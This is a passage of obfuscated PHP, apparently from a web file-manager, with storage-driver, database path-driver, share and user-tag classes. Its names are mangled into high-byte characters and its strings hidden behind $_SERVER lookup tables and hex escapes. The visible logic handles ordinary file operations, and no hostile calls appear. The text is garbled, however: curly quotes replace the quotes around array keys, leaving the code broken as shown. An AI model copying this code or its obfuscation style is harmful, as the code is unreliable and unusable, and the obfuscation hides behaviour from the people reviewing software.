"\x65\x6e\141\x62\154\x65", "\x73\157\x72\x74"); public function listData($ôĞ¦ñæ¨ = false, $¤öÎãœ¢ = "\163\157\162\x74", $å¶õöàÛ = false) { return parent::listData($ôĞ¦ñæ¨, $¤öÎãœ¢, $å¶õöàÛ); } public function add($²¯áû) { $Ôé©ö¶ =& $_SERVER[‘ÆÜ‘œ]; $ŸÏ÷¢ù« = time(); if ($²¯áû[$Ôé©ö¶[16]] == $Ôé©ö¶[2612]) { $ŸÏ÷¢ù« = strtotime($²¯áû[$Ôé©ö¶[205]]); } $²¯áû[$Ôé©ö¶[205]] = $ŸÏ÷¢ù«; return parent::insert($²¯áû); } public function update($ØƒÛÀ¦, $±Í¥ö¿Š) { $»‹åÑ¾æ =& $_SERVER[‘ÆÜ‘œ]; $ØÒ‹ˆŸ = $this->listData($ØƒÛÀ¦); if (!$ØÒ‹ˆŸ) { return !1; } $¬‡ú„¾¹ = time(); if ($±Í¥ö¿Š[$»‹åÑ¾æ[16]] == $»‹åÑ¾æ[2612]) { $¬‡ú„¾¹ = strtotime($±Í¥ö¿Š[$»‹åÑ¾æ[205]]); } $±Í¥ö¿Š[$»‹åÑ¾æ[205]] = $¬‡ú„¾¹; return parent::update($ØƒÛÀ¦, $±Í¥ö¿Š); } public function remove($Ëåõå) { $¡…¼óÜ = $this->listData($Ëåõå); if (!$¡…¼óÜ || $¡…¼óÜ[$_SERVER[‘ÆÜ‘œ][190]]) { return !1; } return parent::remove($Ëåõå); } public function sort($™ŒàšÕş, $Ôş—ù¾¾) { return parent::update($™ŒàšÕş, $Ôş—ù¾¾); } public function enable($üÕø—³, $úğ¸¾Ûû) { return parent::update($üÕø—³, array($_SERVER[‘ÆÜ‘œ][2613] => $úğ¸¾Ûû)); } private function initUserOption() { $Øí…°ì± =& $_SERVER[‘ÆÜ‘œ]; $this->optionType = $Øí…°ì±[2614]; $this->modelType = $Øí…°ì±[2615]; $this->field = array($Øí…°ì±[2616], $Øí…°ì±[32], $Øí…°ì±[205], $Øí…°ì±[33], $Øí…°ì±[2617], $Øí…°ì±[857], $Øí…°ì±[227]); } public function userNoticeGet($Ğ…Ğ”é… = false) { $this->initUserOption(); return parent::listData($Ğ…Ğ”é…, $_SERVER[‘ÆÜ‘œ][495], !0); } public function userNoticeAdd($¢ÔÎ×ÀÜ) { $³´ñüúœ =& $_SERVER[‘ÆÜ‘œ]; $this->initUserOption(); $‰”†äƒ‘ = $this->findByKey($³´ñüúœ[2616], $¢ÔÎ×ÀÜ[$³´ñüúœ[495]]); if ($‰”†äƒ‘) { return !0; } $´†¯×¾ï = array($³´ñüúœ[2616] => $¢ÔÎ×ÀÜ[$³´ñüúœ[495]], $³´ñüúœ[32] => $¢ÔÎ×ÀÜ[$³´ñüúœ[32]], $³´ñüúœ[205] => $¢ÔÎ×ÀÜ[$³´ñüúœ[205]], $³´ñüúœ[33] => isset($¢ÔÎ×ÀÜ[$³´ñüúœ[33]]) ? $¢ÔÎ×ÀÜ[$³´ñüúœ[33]] : 1, $³´ñüúœ[2617] => isset($¢ÔÎ×ÀÜ[$³´ñüúœ[2617]]) ? $¢ÔÎ×ÀÜ[$³´ñüúœ[2617]] : 0, $³´ñüúœ[857] => 0, $³´ñüúœ[227] => 0); return parent::insert($´†¯×¾ï); } public function userNoticeEdit($ôëŸ¥â¡, $³‘Ÿüæû) { $this->initUserOption(); return parent::update($ôëŸ¥â¡, $³‘Ÿüæû); } } goto fœ±Ñ›…; bÔ³°‘íäÅ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ö€ï–¬É) { parent::__construct($Ö€ï–¬É); $this->setSignVersion($_SERVER[‘ÆÜ‘œ][248]); } public function uploadFormData($ÈÏöÀå…, $ñ®³ƒ½Ò = 3600) { $ïßäı›ş =& $_SERVER[‘ÆÜ‘œ]; $ÖÏÄû­† = $ïßäı›ş[230]; $÷ÈÜø = $ïßäı›ş[1475]; $”Âå„Üó = $ïßäı›ş[262]; $Úöš¦±² = gmdate($ïßäı›ş[1476], time() + $ñ®³ƒ½Ò); $å¨ŠÙé© = (string) time() . $ïßäı›ş[74] . (string) (time() + $ñ®³ƒ½Ò); $”µ¥ªŞë = array($ïßäı›ş[263] => $Úöš¦±², $ïßäı›ş[266] => array(array($ïßäı›ş[307] => $ÖÏÄû­†), array($ïßäı›ş[267] => $this->bucket), array($ïßäı›ş[268], $ïßäı›ş[269], $ïßäı›ş[12]), array($ïßäı›ş[271] => $”Âå„Üó), array($ïßäı›ş[1477] => $÷ÈÜø), array($ïßäı›ş[1478] => $this->accessKey), array($ïßäı›ş[1479] => $å¨ŠÙé©))); $”µ¥ªŞë = json_encode($”µ¥ªŞë); $è²¿–¤ë = hash_hmac($ïßäı›ş[1475], $å¨ŠÙé©, $this->secret); $É‚¾Ö¶ô = sha1($”µ¥ªŞë); $ƒÉé¢È = hash_hmac($ïßäı›ş[1475], $É‚¾Ö¶ô, $è²¿–¤ë); $ïíõ•¦æ = array($ïßäı›ş[307] => $ÖÏÄû­†, $ïßäı›ş[271] => $”Âå„Üó, $ïßäı›ş[278] => base64_encode($”µ¥ªŞë), $ïßäı›ş[1477] => $÷ÈÜø, $ïßäı›ş[1478] => $this->accessKey, $ïßäı›ş[1480] => $å¨ŠÙé©, $ïßäı›ş[1481] => $ƒÉé¢È, $ïßäı›ş[207] => $this->getHost()); return $ïíõ•¦æ; } public function fileOutImage($¢µ¥ö½š, $ÃÍâ³ÕÅ = 250) { $¢òô¨Ú– =& $_SERVER[‘ÆÜ‘œ]; if ($this->size($¢µ¥ö½š) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¢µ¥ö½š, $ÃÍâ³ÕÅ); } $Üİä¦è§ = $this->link($¢µ¥ö½š); $Üİä¦è§ .= $¢òô¨Ú–[1482] . $ÃÍâ³ÕÅ . $¢òô¨Ú–[1483]; $this->fileOutLink($Üİä¦è§); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($²Ş©ìŸ¥) { $this->pathParse = $²Ş©ìŸ¥; $this->model = Model($_SERVER[‘ÆÜ‘œ][1484]); } public function getPath($İº–àğ¹) { return trim($İº–àğ¹, $_SERVER[‘ÆÜ‘œ][8]); } public function pathFather($‡ñøÖ±) { $ÌäÆ¥Áò = $this->parse($‡ñøÖ±); $ÌäÆ¥Áò = $this->infoSimple($‡ñøÖ±); return $ÌäÆ¥Áò ? $ÌäÆ¥Áò[$_SERVER[‘ÆÜ‘œ][191]] : !1; } public function pathThis($ŠøÅ¢Œê) { $ÍÁÍÏ´Ä = $this->infoSimple($ŠøÅ¢Œê); return $ÍÁÍÏ´Ä ? $ÍÁÍÏ´Ä[$_SERVER[‘ÆÜ‘œ][32]] : !1; } public function getPathOuter($Ø‘¸¿) { if (!$Ø‘¸¿) { return $Ø‘¸¿; } $ûÒŒ”Ì˜ = $this->parse($Ø‘¸¿); return KodIO::make($ûÒŒ”Ì˜[$_SERVER[‘ÆÜ‘œ][495]]); } public function copyFolderFromIO($åé®´ç, $²çŸÏµÁ, $Õ¦°Ïèò, $¦ÏÒË©, $©ßù€ç­) { $×Õ‹ ‡– = $this->model->copyFolderFromIO($åé®´ç, $²çŸÏµÁ, $Õ¦°Ïèò, $¦ÏÒË©, $©ßù€ç­); return KodIO::make($×Õ‹ ‡–); } public function isParentOf($²˜Ç®×, $­î¸½Éº) { return $this->model->isParentOf($²˜Ç®×, $­î¸½Éº); } public function mkfile($Ó˜ÉÛê¦, $üÒ®È†¾ = '', $ªù¤˜Â¡ = REPEAT_RENAME) { $—‘¬àÖ† =& $_SERVER[‘ÆÜ‘œ]; $§êÒşê‚ = $this->parse($Ó˜ÉÛê¦); $Ó˜ÉÛê¦ = $§êÒşê‚[$—‘¬àÖ†[495]]; for ($İšâÌ = 0; $İšâÌ < count($§êÒşê‚[$—‘¬àÖ†[1485]]); $İšâÌ++) { $î›¹¸Ì† = $§êÒşê‚[$—‘¬àÖ†[1485]][$İšâÌ]; if ($İšâÌ == count($§êÒşê‚[$—‘¬àÖ†[1485]]) - 1) { $Ó˜ÉÛê¦ = $this->model->mkfile($Ó˜ÉÛê¦, $î›¹¸Ì†, $üÒ®È†¾, $ªù¤˜Â¡); break; } $Ó˜ÉÛê¦ = $this->model->mkdir($Ó˜ÉÛê¦, $î›¹¸Ì†, REPEAT_SKIP); } return $this->getPathOuter($Ó˜ÉÛê¦); } public function mkdir($±‰µÑÅŒ, $šß³”Â§ = REPEAT_SKIP) { $Éš¿êÁ¡ =& $_SERVER[‘ÆÜ‘œ]; $ş¿ŒÌµ” = $this->parse($±‰µÑÅŒ); $±‰µÑÅŒ = $ş¿ŒÌµ”[$Éš¿êÁ¡[495]]; for ($È¨ÄÅ“í = 0; $È¨ÄÅ“í < count($ş¿ŒÌµ”[$Éš¿êÁ¡[1485]]); $È¨ÄÅ“í++) { $¹×åÆª = $ş¿ŒÌµ”[$Éš¿êÁ¡[1485]][$È¨ÄÅ“í]; $±‰µÑÅŒ = $this->model->mkdir($±‰µÑÅŒ, $¹×åÆª, $šß³”Â§); } return $this->getPathOuter($±‰µÑÅŒ); } public function copyFile($ıĞı­•é, $ã¤ÌÙ‰Š, $™™·…ì¡ = REPEAT_REPLACE) { $ëŒ‚‘ä =& $_SERVER[‘ÆÜ‘œ]; $Õ«à İÉ = $this->parse($ã¤ÌÙ‰Š); $üÚëÒ™€ = $this->model->copy($ıĞı­•é, $Õ«à İÉ[$ëŒ‚‘ä[495]], $™™·…ì¡, $Õ«à İÉ[$ëŒ‚‘ä[87]]); return $üÚëÒ™€ ? $this->getPathOuter($üÚëÒ™€) : !1; } public function moveFile($†”š¯Şû, $íŞşÂ¶, $öæü‘‚Í = REPEAT_REPLACE) { $ÊÊÏşß =& $_SERVER[‘ÆÜ‘œ]; $±ÑãÊîÎ = $this->parse($íŞşÂ¶); $ò…Òë¼‘ = $this->model->move($†”š¯Şû, $±ÑãÊîÎ[$ÊÊÏşß[495]], $öæü‘‚Í, $±ÑãÊîÎ[$ÊÊÏşß[87]]); return $ò…Òë¼‘ ? $this->getPathOuter($ò…Òë¼‘) : !1; } public function copy($êşšíÃ¬, $âº‘÷´œ, $Ÿ»Æì—ö = REPEAT_REPLACE, $Å¡Ï¸ç = false) { $á´üı˜ = $this->parse($âº‘÷´œ); $ùàØ·¾ò = $this->model->copy($êşšíÃ¬, $á´üı˜[$_SERVER[‘ÆÜ‘œ][495]], $Ÿ»Æì—ö, $Å¡Ï¸ç); return $ùàØ·¾ò ? $this->getPathOuter($ùàØ·¾ò) : !1; } public function moveSameAllow() { } public function move($Áª’æëĞ, $‰šÔïÕ, $éÙ –í = REPEAT_REPLACE, $Ó”ëµ˜ó = false) { $‚‚Êáíö = $this->parse($‰šÔïÕ); $ËÀî¾¼ù = $this->model->move($Áª’æëĞ, $‚‚Êáíö[$_SERVER[‘ÆÜ‘œ][495]], $éÙ –í, $Ó”ëµ˜ó); return $ËÀî¾¼ù ? $this->getPathOuter($ËÀî¾¼ù) : !1; } public function remove($»ŠÉ£ÂÀ, $Â¡õ«ŞÕ = true) { return $this->model->remove($»ŠÉ£ÂÀ, $Â¡õ«ŞÕ); } public function rename($Áéö‚¯Ò, $ø‹ÛÜ˜Û) { $éÌüÏÇÃ = $this->model->rename($Áéö‚¯Ò, $ø‹ÛÜ˜Û); return $éÌüÏÇÃ ? $this->getPathOuter($Áéö‚¯Ò) : $éÌüÏÇÃ; } public function size($†¤Êå£) { $º‰š­í¢ = $this->infoSimple($†¤Êå£); return $º‰š­í¢ ? $º‰š­í¢[$_SERVER[‘ÆÜ‘œ][79]] : 0; } public function infoSimple($ÃŒ‹ó´ş) { return $this->model->sourceInfo($ÃŒ‹ó´ş); } public function info($ŸˆÖè³Â) { return $this->infoParse($ŸˆÖè³Â); } public function infoAuth($¦úÍ¤î) { return $this->infoParse($¦úÍ¤î, !1, !0); } public function infoWithChildren($¸·«Äà) { return $this->infoParse($¸·«Äà, !0); } protected function infoParse($Ç†”ş¥ç, $«Ï«§®î = false, $£óŒÀÍ‹ = false) { if (!$«Ï«§®î) { return $this->model->pathInfo($Ç†”ş¥ç, $£óŒÀÍ‹); } return $this->model->pathInfoMore($Ç†”ş¥ç); } public function infoFullSimple($÷ú‘”ê) { $æ‘÷æ“Ğ =& $_SERVER[‘ÆÜ‘œ]; $¡ãæÔÇÑ = explode($æ‘÷æ“Ğ[8], $÷ú‘”ê); $œ£…„û¿ = implode($æ‘÷æ“Ğ[8], array_splice($¡ãæÔÇÑ, 1)); return $this->model->pathInfoByPath($¡ãæÔÇÑ[0], $œ£…„û¿); } public function infoFull($Œı±ì§Å) { $òÅ™Ÿí = $this->infoFullSimple($Œı±ì§Å); return is_array($òÅ™Ÿí) ? $this->model->pathInfo($òÅ™Ÿí[$_SERVER[‘ÆÜ‘œ][192]]) : !1; } public function hashSimple($Õï´ßø·) { $è£²Îñ =& $_SERVER[‘ÆÜ‘œ]; $òùÙ®Ú¬ = $this->infoWithChildren($Õï´ßø·); return $òùÙ®Ú¬[$è£²Îñ[168]][$è£²Îñ[702]]; } public function hashMd5($”ô°öÒâ) { $Ø½àíÁ =& $_SERVER[‘ÆÜ‘œ]; $¡Ş•ñ« = $this->infoWithChildren($”ô°öÒâ); return $¡Ş•ñ«[$Ø½àíÁ[168]][$Ø½àíÁ[571]]; } public function exist($³“†­ãø) { $˜Ùú†ûç =& $_SERVER[‘ÆÜ‘œ]; $êìõ£µÌ = $this->parse($³“†­ãø); if (!$êìõ£µÌ[$˜Ùú†ûç[87]]) { return $this->isFile($³“†­ãø) || $this->isFolder($³“†­ãø); } $£”óÇ¡ = array($˜Ùú†ûç[500] => $êìõ£µÌ[$˜Ùú†ûç[495]], $˜Ùú†ûç[32] => $êìõ£µÌ[$˜Ùú†ûç[87]]); $ğÁÛ³µ = $this->model->where($£”óÇ¡)->find(); return $ğÁÛ³µ ? !0 : !1; } public function isFile($°é…øä°) { $¾ñß÷µ˜ =& $_SERVER[‘ÆÜ‘œ]; $õâ±¿€Ñ = $this->infoSimple($°é…øä°); return $õâ±¿€Ñ && $õâ±¿€Ñ[$¾ñß÷µ˜[508]] == $¾ñß÷µ˜[229] ? !0 : !1; } public function isFolder($×êôÁàÛ) { $¯Ø¼‚¨İ =& $_SERVER[‘ÆÜ‘œ]; $ä¼…˜¬ = $this->infoSimple($×êôÁàÛ); return $ä¼…˜¬ && $ä¼…˜¬[$¯Ø¼‚¨İ[508]] == $¯Ø¼‚¨İ[91] ? !0 : !1; } public function listPath($‡«€ª§, $ÓšÔñŞÃ = false) { $¿ã™Ü— =& $_SERVER[‘ÆÜ‘œ]; if ($‡«€ª§ == $¿ã™Ü—[12]) { return !1; } $Ü´ûÓ¸« = array($¿ã™Ü—[500] => $‡«€ª§); if ($ÓšÔñŞÃ) { return $this->model->listSource($Ü´ûÓ¸«, -1); } return $this->model->listSource($Ü´ûÓ¸«); } public function has($º‡ú–²Ø, $âÚ¶úá¤ = false, $§ÓÔó­ = null) { $š—§Ö’¶ =& $_SERVER[‘ÆÜ‘œ]; $ğÖõ‰Òë = $this->infoWithChildren($º‡ú–²Ø); if ($âÚ¶úá¤) { return array($š—§Ö’¶[241] => $ğÖõ‰Òë[$š—§Ö’¶[241]], $š—§Ö’¶[240] => $ğÖõ‰Òë[$š—§Ö’¶[240]]); } return $§ÓÔó­ ? $ğÖõ‰Òë[$š—§Ö’¶[241]] : $ğÖõ‰Òë[$š—§Ö’¶[240]]; } public function listAll($šìõ™öï) { $™üÇ…¤ = IO::info($this->pathParse[$_SERVER[‘ÆÜ‘œ][87]]); if (!$™üÇ…¤) { return array(); } return $this->model->listAll($šìõ™öï); } public function getContent($Çò®™ŸŸ) { return $this->model->getContent($Çò®™ŸŸ); } public function setContent($ƒ¼î£Áğ, $À•Š£Ù¶ = '') { return $this->model->setContent($ƒ¼î£Áğ, $À•Š£Ù¶); } public function fileSubstr($Ì“ñ´«, $î„«çœ‹, $ßŞ¦Ö”±) { return $this->model->fileSubstr($Ì“ñ´«, $î„«çœ‹, $ßŞ¦Ö”±); } public function download($İŒ îìû, $ÙÜ¥† = '') { $Ä²ì¾ = get_path_father($ÙÜ¥†); $Ò¿™£µĞ = get_path_this($ÙÜ¥†); $á¨±é‡û = $this->model->fileInfoGet($İŒ îìû); $å¼·§‹ò = IO::copy($á¨±é‡û[$_SERVER[‘ÆÜ‘œ][87]], $Ä²ì¾, !1, $Ò¿™£µĞ); return $å¼·§‹ò; } public function setModifyTime($»ƒ‡‡û’, $—ƒÂİ˜õ = '') { $«³š¥Ò =& $_SERVER[‘ÆÜ‘œ]; if (!$»ƒ‡‡û’) { return; } $this->model->where(array($«³š¥Ò[514] => $»ƒ‡‡û’))->save(array($«³š¥Ò[88] => $—ƒÂİ˜õ)); } public function upload($Öº”äÎ¢, $®¡´ï¶Ü, $ÑšùçÓÜ = false, $®·£–Ú´ = REPEAT_REPLACE) { $²¾»ãûû =& $_SERVER[‘ÆÜ‘œ]; $–‰‡— = $this->parse($Öº”äÎ¢); $ä¿×Ì›° = $this->model->addFile($–‰‡—[$²¾»ãûû[495]], $®¡´ï¶Ü, $–‰‡—[$²¾»ãûû[87]], $ÑšùçÓÜ, $®·£–Ú´); return $this->getPathOuter($ä¿×Ì›°); } public function uploadFileByID($ÌÀÆæ†¬, $£ƒÜÚàÚ, $â¯¥øê´) { $€‹×İ…â =& $_SERVER[‘ÆÜ‘œ]; $·®ÊÚÄí = $this->parse($ÌÀÆæ†¬); $ÕŒ ±âŸ = $this->model->addFileByFileID($·®ÊÚÄí[$€‹×İ…â[495]], $£ƒÜÚàÚ, $·®ÊÚÄí[$€‹×İ…â[87]], $â¯¥øê´); return $this->getPathOuter($ÕŒ ±âŸ); } public function addFileByRemote($œª×ƒë‰, $äîó¸ç, $„‚ğŸ = array(), $µ¿§ûšÛ = '', $ßö¿€ ¥) { $šË•ãäê =& $_SERVER[‘ÆÜ‘œ]; $³áæŒÒ± = $this->parse($œª×ƒë‰); $µ¿§ûšÛ = empty($µ¿§ûšÛ) ? $³áæŒÒ±[$šË•ãäê[87]] : $µ¿§ûšÛ; $Ëğ”äåÙ = $this->model->addFileByRemote($³áæŒÒ±[$šË•ãäê[495]], $äîó¸ç, $µ¿§ûšÛ, $„‚ğŸ, $ßö¿€ ¥); return $this->getPathOuter($Ëğ”äåÙ); } public function uploadLink($£áéÎ÷ , $ç‰¿ô›¨ = 0) { $º¾äËÈ =& $_SERVER[‘ÆÜ‘œ]; $Ë¢–¹® = $this->parse($£áéÎ÷ ); $òüÚÃÎ² = _get($GLOBALS[$º¾äËÈ[7]], $º¾äËÈ[1486]); $Å–ùçŞû = _get($GLOBALS[$º¾äËÈ[7]], $º¾äËÈ[1487]); $çåæûÆ• = KodIO::ioFileDriverGet($º¾äËÈ[506] . $Ë¢–¹®[$º¾äËÈ[495]] . $º¾äËÈ[412]); $È¢²·üÇ = Model($º¾äËÈ[704])->createFileName($Ë¢–¹®[$º¾äËÈ[87]], $çåæûÆ•, $òüÚÃÎ², $Å–ùçŞû); return IO::uploadLink($È¢²·üÇ, $ç‰¿ô›¨); } public function fileNameAuto($Õä×£Éß, $àİØ‚œŒ, $Õ‡Ë—Ì¬ = REPEAT_REPLACE, $‘ÀùªŠ = false) { return $this->model->fileNameAuto($Õä×£Éß, $àİØ‚œŒ, $Õ‡Ë—Ì¬, $‘ÀùªŠ); } public function fileNameExist($ŞâÏÇ¥ê, $ªÅË¬âŞ) { return $this->model->fileNameExist($ŞâÏÇ¥ê, $ªÅË¬âŞ); } protected function _fileOut($ÅÔãĞÀƒ, $‰ú¯Ü¿Ï = false, $ÁŸ£™ŠÃ = false, $Â”Şİğ = '', $¢Ùˆ°¬Ÿ = false) { $ŸÉ†±§ =& $_SERVER[‘ÆÜ‘œ]; $ ¤Ë®ã¡ = $this->model->sourceInfo($ÅÔãĞÀƒ); if ($ ¤Ë®ã¡[$ŸÉ†±§[508]] == $ŸÉ†±§[91]) { header($ŸÉ†±§[1488]); die; } $¨’¹ƒ = $this->model->fileInfoGet($ÅÔãĞÀƒ); $Â”Şİğ = $¨’¹ƒ[$ŸÉ†±§[571]] ? $¨’¹ƒ[$ŸÉ†±§[571]] : $Â”Şİğ; $Ÿµ‹¶™Î = isset($GLOBALS[$ŸÉ†±§[181]]) && is_array($GLOBALS[$ŸÉ†±§[181]]) ? $GLOBALS[$ŸÉ†±§[181]][$ŸÉ†±§[32]] : $ ¤Ë®ã¡[$ŸÉ†±§[32]]; if ($¢Ùˆ°¬Ÿ) { return IO::fileOutServer($¨’¹ƒ[$ŸÉ†±§[87]], $‰ú¯Ü¿Ï, $Ÿµ‹¶™Î, $Â”Şİğ); } IO::fileOut($¨’¹ƒ[$ŸÉ†±§[87]], $‰ú¯Ü¿Ï, $Ÿµ‹¶™Î, $Â”Şİğ); } public function fileOut($‰àâ‘Úş, $Àˆû¾‰… = false, $ß™¦Ñ¯ = false, $ğÄ‚ûğ = '') { $this->_fileOut($‰àâ‘Úş, $Àˆû¾‰…, $ß™¦Ñ¯, $ğÄ‚ûğ); } public function fileOutServer($ş±ÜÆÛ„, $Ûá˜¾É² = false, $ ¼­É·í = false, $ë³½¦ß¤ = '') { $this->_fileOut($ş±ÜÆÛ„, $Ûá˜¾É², $ ¼­É·í, $ë³½¦ß¤, !0); } protected function _fileOutImage($¸ôñâßÀ, $ŠÊ³‡½¨ = 250) { $ı‘¬Õ” =& $_SERVER[‘ÆÜ‘œ]; $ÚÖº‘ÖĞ = $this->model->pathInfo($¸ôñâßÀ); if ($ÚÖº‘ÖĞ[$ı‘¬Õ”[508]] == $ı‘¬Õ”[91]) { show_json($ı‘¬Õ”[1489] . $¸ôñâßÀ, !1); } $½ğëçÒÆ = $this->model->fileInfoGet($¸ôñâßÀ); $ÚÖº‘ÖĞ[$ı‘¬Õ”[182]] = $½ğëçÒÆ[$ı‘¬Õ”[87]]; $GLOBALS[$ı‘¬Õ”[181]] = $ÚÖº‘ÖĞ; IO::fileOutImage($½ğëçÒÆ[$ı‘¬Õ”[87]], $ŠÊ³‡½¨); } public function fileOutImage($‘²çïîù, $÷£ÉÓå¯ = 250) { $this->_fileOutImage($‘²çïîù, $÷£ÉÓå¯); } public function fileOutImageServer($™““ú, $¿á²Ã‚› = 250) { $this->_fileOutImage($™““ú, $¿á²Ã‚›); } public function link($Ô¬¨ ™ù, $Í§®¿ıİ = '') { $ç¶¿…êµ = $this->model->fileInfoGet($Ô¬¨ ™ù); return IO::link($ç¶¿…êµ[$_SERVER[‘ÆÜ‘œ][87]], $Í§®¿ıİ); } protected function parse($Êë”­˜‹) { $ÀıïË®ï =& $_SERVER[‘ÆÜ‘œ]; if (strstr($Êë”­˜‹, $ÀıïË®ï[8]) === !1) { return array($ÀıïË®ï[516] => intval($Êë”­˜‹), $ÀıïË®ï[87] => $ÀıïË®ï[12], $ÀıïË®ï[1485] => array()); } $à®ú»ıÄ = explode($ÀıïË®ï[8], trim($Êë”­˜‹, $ÀıïË®ï[8])); if (count($à®ú»ıÄ) < 2) { show_tips(clear_html($Êë”­˜‹) . $ÀıïË®ï[1490]); } return array($ÀıïË®ï[516] => intval($à®ú»ıÄ[0]), $ÀıïË®ï[87] => $à®ú»ıÄ[1], $ÀıïË®ï[1485] => array_slice($à®ú»ıÄ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($›¥¢­­­) { $this->pathParse = $›¥¢­­­; $this->model = Model($_SERVER[‘ÆÜ‘œ][1484]); } public function getPathRoot() { $ˆúô’ =& $_SERVER[‘ÆÜ‘œ]; return KodIO::makeShare($this->pathParse[$ˆúô’[495]], $this->pathParse[$ˆúô’[1308]]); } public function getPathOuter($î£ÜÂÚ) { $£ ¨ÁÆ” =& $_SERVER[‘ÆÜ‘œ]; if (!$î£ÜÂÚ) { return $î£ÜÂÚ; } $½çÊºùÉ = $this->parse($î£ÜÂÚ); return trim(KodIO::makeShare($this->pathParse[$£ ¨ÁÆ”[495]], $½çÊºùÉ[$£ ¨ÁÆ”[495]]), $£ ¨ÁÆ”[8]); } public function isParentOf($³ª„§ª«, $î æ»Š¯) { $¡Ïˆò÷ = IO::init($î æ»Š¯); return $this->model->isParentOf($³ª„§ª«, $¡Ïˆò÷->path); } protected function infoParse($‘¥ºöë, $øŞÆÁÇ‹ = false, $¨éı¾¿© = false) { $é‚ÕÖ¥™ =& $_SERVER[‘ÆÜ‘œ]; static $Ù³½ÔØ = array(); $Ôöãş»æ = $this->pathParse[$é‚ÕÖ¥™[495]]; $¼ØÕŒçä = trim($this->pathParse[$é‚ÕÖ¥™[1304]], $é‚ÕÖ¥™[8]); if (isset($Ù³½ÔØ[$¼ØÕŒçä]) && is_array($Ù³½ÔØ[$¼ØÕŒçä])) { return $Ù³½ÔØ[$¼ØÕŒçä]; } $¢ıòôğ· = Action($é‚ÕÖ¥™[1491])->sharePathInfo($Ôöãş»æ, $¼ØÕŒçä, $øŞÆÁÇ‹); $Ù³½ÔØ[$¼ØÕŒçä] = $¢ıòôğ·; return $¢ıòôğ·; } public function infoFull($”¶ÍÑ´Œ) { $®¨‚Ïïİ =& $_SERVER[‘ÆÜ‘œ]; $êÌùô„ = explode($®¨‚Ïïİ[8], trim($”¶ÍÑ´Œ, $®¨‚Ïïİ[8])); if (count($êÌùô„) > 1) { $´ÔâÖ­å = implode($®¨‚Ïïİ[8], array_splice($êÌùô„, 1)); $ĞÎæçƒó = $this->model->pathInfoByPath($êÌùô„[0], $´ÔâÖ­å); if (!$ĞÎæçƒó) { return !1; } $this->pathParse[$®¨‚Ïïİ[1304]] = $ĞÎæçƒó[$®¨‚Ïïİ[192]]; } return $this->infoParse($”¶ÍÑ´Œ); } public function listAll($¦Ê­œ‡ò) { $ÄôÇ›Êî =& $_SERVER[‘ÆÜ‘œ]; $Õ†µ„—­ = IO::info($this->pathParse[$ÄôÇ›Êî[87]]); if (!$Õ†µ„—­) { return array(); } $…©½—Öü = $this->model->listAll($¦Ê­œ‡ò); $‰Ø€áß = Model($ÄôÇ›Êî[694])->getInfo($Õ†µ„—­[$ÄôÇ›Êî[695]]); foreach ($…©½—Öü as &$€û‹î£) { check_abort(); $€û‹î£[$ÄôÇ›Êî[90]] = Action($ÄôÇ›Êî[1491])->_shareItemeParse($€û‹î£[$ÄôÇ›Êî[90]], $‰Ø€áß); } unset($€û‹î£); return $…©½—Öü; } } goto dèÚ•…Õ¢£; AÌ¾©…Ñ­Ğ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\141\166"; protected function cacheFunctionAlias($íüğÅ¯¢) { $øçÉ—¾™ =& $_SERVER[‘ÆÜ‘œ]; return array($øçÉ—¾™[2248] => array($øçÉ—¾™[2678] . USER_ID, $øçÉ—¾™[2249])); } protected function ___listData() { $´âó“µ  =& $_SERVER[‘ÆÜ‘œ]; $ù×Ü–áº = array($´âó“µ [1921] => USER_ID, $´âó“µ [581] => array($´âó“µ [2252], 0)); $†ú‡‰¸Ù = $´âó“µ [2679]; $Šß³ÅŞ¦ = $this->field($†ú‡‰¸Ù)->where($ù×Ü–áº)->order($´âó“µ [2254])->select(); return $Šß³ÅŞ¦ ? $Šß³ÅŞ¦ : array(); } protected function addToTag($Œ ó õ¯, $±Â—„‚ó) { $‘¥Ø×¬ß =& $_SERVER[‘ÆÜ‘œ]; if (!Model($‘¥Ø×¬ß[2405])->listData($±Â—„‚ó)) { return !1; } if (is_numeric($Œ ó õ¯)) { $¤‡˜‡Ùğ = Model($‘¥Ø×¬ß[939])->pathInfo($Œ ó õ¯); if (!$¤‡˜‡Ùğ) { return !1; } } else { $¤‡˜‡Ùğ = IO::infoSimple($Œ ó õ¯); if (!$¤‡˜‡Ùğ) { return !1; } $ÇøŒâìÔ = $¤‡˜‡Ùğ[$‘¥Ø×¬ß[32]]; $œõ´‘ºÇ = $¤‡˜‡Ùğ[$‘¥Ø×¬ß[33]]; if (isset($¤‡˜‡Ùğ[$‘¥Ø×¬ß[508]])) { $œõ´‘ºÇ = $¤‡˜‡Ùğ[$‘¥Ø×¬ß[508]] == $‘¥Ø×¬ß[91] ? $‘¥Ø×¬ß[78] : $‘¥Ø×¬ß[231]; } } $¬šĞü•Ê = array($‘¥Ø×¬ß[1921] => USER_ID, $‘¥Ø×¬ß[581] => $±Â—„‚ó, $‘¥Ø×¬ß[518] => $Œ ó õ¯, $‘¥Ø×¬ß[519] => $œõ´‘ºÇ ? $œõ´‘ºÇ : $‘¥Ø×¬ß[513], $‘¥Ø×¬ß[517] => $ÇøŒâìÔ ? $ÇøŒâìÔ : $‘¥Ø×¬ß[12], $‘¥Ø×¬ß[2140] => 0); if ($this->where($¬šĞü•Ê)->find()) { return !1; } return $this->add($¬šĞü•Ê); } protected function removeFromTag($¼¤–…±, $Ö¥«òÅ) { $ÙÎù¤†Ü =& $_SERVER[‘ÆÜ‘œ]; if (!Model($ÙÎù¤†Ü[2405])->listData($Ö¥«òÅ)) { return !1; } if (is_array($¼¤–…±)) { $¼¤–…± = array($ÙÎù¤†Ü[7], $¼¤–…±); } $ı×Ğ¦ºÕ = array($ÙÎù¤†Ü[1921] => USER_ID, $ÙÎù¤†Ü[581] => $Ö¥«òÅ, $ÙÎù¤†Ü[518] => $¼¤–…±); return $this->where($ı×Ğ¦ºÕ)->delete(); } protected function removeByTag($Ñ¡²‹«İ) { $ÅóÅ³ëÜ =& $_SERVER[‘ÆÜ‘œ]; if (!$Ñ¡²‹«İ) { return !1; } $ïŞàãâ¡ = array($ÅóÅ³ëÜ[1921] => USER_ID, $ÅóÅ³ëÜ[581] => $Ñ¡²‹«İ); return $this->where($ïŞàãâ¡)->delete(); } protected function removeBySource($î›ÆéÄ) { 